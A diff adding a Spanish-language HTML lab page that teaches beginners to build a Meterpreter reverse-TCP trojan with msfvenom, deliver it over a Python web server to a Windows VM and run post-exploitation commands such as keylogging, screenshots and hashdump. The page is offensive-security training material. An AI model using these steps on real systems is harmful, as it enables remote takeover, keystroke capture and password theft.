@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Laboratorio Inicial: Explotación en Windows vulnerable | CRD</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="assets/css/estilos.css">
+</head>
+<body>
+<main>
+  <div data-include="aviso-etico"></div>
+
+  <h1>✅ Laboratorio 1: Introducción a Metasploit y Payloads (Windows vulnerable)</h1>
+
+  <p>
+    Este laboratorio es el primer paso en el mundo del Red Teaming. Aprenderás a generar un ejecutable malicioso (Trojan), transferirlo a una víctima y tomar el control remoto de un sistema Windows vulnerable desprotegido.
+  </p>
+
+  <hr>
+
+  <h2>📝 1. Objetivo General</h2>
+  <p>
+    Obtener una sesión de <strong>Meterpreter</strong> en un sistema Windows vulnerable mediante una conexión inversa (Reverse TCP), comprendiendo la arquitectura básica de un ataque cliente-servidor en ciberseguridad.
+  </p>
+
+  <hr>
+
+  <h2>🧱 2. Arquitectura del Laboratorio</h2>
+  <figure style="text-align: center;">
+      <img src="assets/img/ACL-meta.png" alt="Topología de Red" style="width:60%; border-radius: 8px; margin: 20px 0; border: 1px solid #ddd;">
+      <figcaption><strong>Figura 1:</strong> Conexión Atacante (Kali) vs Víctima (Windows vulnerable)</figcaption>
+  </figure>
+  <ul>
+    <li><strong>Red:</strong> VMnet1 (Host-only).</li>
+    <li><strong>DHCP:</strong> Habilitado para asignación automática de IPs.</li>
+    <li><strong>Conectividad:</strong> Probar con <code>ping</code> antes de iniciar.</li>
+  </ul>
+
+  <hr>
+
+  <h2>⚙️ 3. Desarrollo del Ataque</h2>
+
+  <h3>🔸 3.1. Generación del payload (En Kali)</h3>
+  <p>Abrí una terminal en Kali y generá el archivo ejecutable que se enviará a la víctima:</p>
+
+  <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;TU_IP_KALI&gt; LPORT=4444 -f exe -o MiTrojan.exe</code></pre>
+
+  <p><strong>Desglose del comando:</strong></p>
+  <ul>
+    <li><code>reverse_tcp</code>: La víctima se conecta a nosotros (Atacante).</li>
+    <li><code>LHOST</code>: Tu dirección IP (donde recibirás la conexión).</li>
+    <li><code>-f exe</code>: Crea un archivo ejecutable de Windows.</li>
+  </ul>
+
+  <h3>🔸 3.2. Transferencia del archivo</h3>
+  <p>Activá un servidor web rápido en Kali para que la víctima pueda descargar el archivo:</p>
+  <pre><code>python3 -m http.server 80</code></pre>
+  <p>En el <strong>Windows vulnerable</strong>, abrí el navegador y navegá a <code>http://&lt;IP_DE_KALI&gt;</code> para descargar <strong>MiTrojan.exe</strong>.</p>
+
+  <h3>🔸 3.3. Configuración del "Escucha" (Listener)</h3>
+  <p>Antes de ejecutar el virus en Windows, debés preparar a Metasploit para recibir la conexión:</p>
+
+  <pre><code>msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST &lt;TU_IP_KALI&gt;
+set LPORT 4444
+exploit</code></pre>
+
+  <hr>
+
+  <h2>📂 4. Post-Explotación (Anexo de Comandos)</h2>
+  <p>Una vez que veas <code>Meterpreter session 1 opened</code>, probá estos comandos:</p>
+
+  <table border="1" cellpadding="6" style="width:100%; border-collapse: collapse;">
+    <tr style="background-color: #f2f2f2;">
+        <th>Comando</th>
+        <th>Acción</th>
+    </tr>
+    <tr><td><code>sysinfo</code></td><td>Ver información de la víctima.</td></tr>
+    <tr><td><code>screenshot</code></td><td>Capturar la pantalla actual.</td></tr>
+    <tr><td><code>keyscan_start</code></td><td>Empezar a grabar el teclado.</td></tr>
+    <tr><td><code>keyscan_dump</code></td><td>Ver lo que el usuario escribió.</td></tr>
+    <tr><td><code>shell</code></td><td>Entrar a la consola CMD de Windows.</td></tr>
+    <tr><td><code>hashdump</code></td><td>Extraer las contraseñas del sistema.</td></tr>
+  </table>
+
+  <hr>
+
+  <h2>📚 5. Conclusión y Lecciones Aprendidas</h2>
+  <p>
+    Este ataque funciona porque Windows vulnerable no posee las defensas modernas que analizan el comportamiento de los procesos en tiempo real. La técnica de <strong>Reverse TCP</strong> es fundamental para saltar firewalls que bloquean entradas, pero permiten salidas de red.
+  </p>
+  <p><strong>⚠️ El siguiente paso:</strong> En el próximo laboratorio, veremos que este método falla en Windows 11 debido al Antivirus Defender, y aprenderemos técnicas de evasión para superarlo.</p>
+
+  <hr>
+
+  <h2>📖 Referencias</h2>
+  <ul>
+    <li><a href="https://attack.mitre.org/techniques/T1059/" target="_blank">MITRE T1059 - Command and Scripting Interpreter</a></li>
+    <li><a href="https://www.metasploit.com/" target="_blank">Metasploit Official Site</a></li>
+  </ul>
+
+<form id="form-reportar" class="form-horizontal">
+  <input type="hidden" id="titulo" name="titulo" value="Laboratorio 1: Windows vulnerable Exploit">
+  <input type="hidden" id="archivo" name="archivo" value="lab_win7_basico.html">
+  <input type="hidden" id="fecha" name="fecha">
+  <textarea id="comentario" name="comentario" placeholder="¿Lograste obtener la sesión Meterpreter? Describí tu experiencia." required></textarea>
+  <button type="submit">Enviar Reporte</button>
+</form>
+
+</main>
+<div data-include="footer"></div>
+<script src="assets/js/scripts.js"></script>
+</body>
+</html>
